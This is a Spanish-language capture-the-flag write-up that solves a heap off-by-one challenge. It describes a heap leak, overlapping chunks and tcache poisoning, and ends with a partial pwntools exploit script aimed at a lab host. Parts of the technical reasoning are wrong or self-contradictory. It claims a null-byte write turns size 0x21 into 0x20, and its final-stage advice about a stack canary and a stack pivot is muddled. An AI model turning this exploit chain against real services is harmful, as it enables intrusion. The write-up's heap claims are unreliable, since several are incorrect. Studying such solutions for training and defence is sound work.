# Solución — pwn-off-by-one

## Vulnerabilidad
`str_copy()` usa `i <= len` → escribe null byte en `dst[len]` (un byte más allá del chunk).
El chunk tiene `malloc(sz+1)`, por lo que el null byte cae en el header del siguiente chunk.

## Cadena de explotación

### Paso 1: Leak de heap address
- alloc(0, 0x18), alloc(1, 0x18), alloc(2, 0x18)
- free(1) → queda en tcache
- cmd_show(0) o cmd_info muestra las direcciones de los chunks

### Paso 2: Off-by-one para overlapping chunks
- alloc(3, 0x38) — chunk grande después de chunk 0
- free(3) → en tcache 0x40
- set(0, "A"*0x18) → str_copy escribe null en byte 0 del size de chunk 1 adyacente
- El size de chunk 1 cambia de 0x21 a 0x20 (pierde el PREV_INUSE bit)
- Ahora alloc(4, 0x38) reclama el espacio solapando con chunk 1

### Paso 3: Tcache poisoning
- Con overlapping: escribir en chunk 4 modifica los datos de chunk 1
- Cuando se libera chunk 1, el fd pointer apunta a dirección controlada
- alloc(5, 0x18) → se lleva el primer elemento del tcache
- alloc(6, 0x18) → se lleva la dirección arbitraria → escritura arbitraria

### Paso 4: Arbitrary write → RCE
En glibc 2.35 (Ubuntu 22.04), __free_hook fue removido.
Usar `_IO_list_all` o technique de house-of-botcake.
Alternativa: sobreescribir `got.exit` si hay RELRO parcial (no en este caso).
Usar: overwrite `stack canary` o tcache_perthread_struct para stack pivot.

## Exploit esqueleto
```python
from pwn import *

p = remote('172.30.4.31', 9998)

def alloc(idx, sz, content=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index', str(idx).encode())
    p.sendlineafter(b'Size',  str(sz).encode())
    p.sendlineafter(b'Content', content)

def set_str(idx, content):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index', str(idx).encode())
    p.sendlineafter(b'content', content)

def free(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index', str(idx).encode())
    return p.recvline()

# Setup: dos chunks adyacentes del mismo tamaño
alloc(0, 0x18, b'A'*0x18)
alloc(1, 0x18, b'B'*0x18)
alloc(2, 0x08, b'guard')   # evita consolidación con top chunk

# Off-by-one: sobreescribe size[1] con 0x00
set_str(0, b'A' * 0x18)    # str_copy escribe null en chunk[1].size LSB

# ... continuar con tcache dup y arbitrary write
p.interactive()
```
